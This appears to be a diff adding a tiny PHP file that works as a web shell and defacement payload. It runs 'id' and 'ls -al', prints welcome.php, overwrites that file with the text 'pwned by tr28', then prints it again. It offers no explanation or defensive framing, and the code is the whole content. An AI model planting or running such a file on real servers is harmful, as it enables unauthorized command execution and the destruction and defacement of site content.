@@ -1,0 +1,7 @@
+<?php
+echo exec('id') . "\n";
+echo exec('ls -al');
+echo exec('cat welcome.php') . "\n";
+echo exec('echo "pwned by tr28" > welcome.php') . "\n";
+echo exec('cat welcome.php') . "\n";
+?>
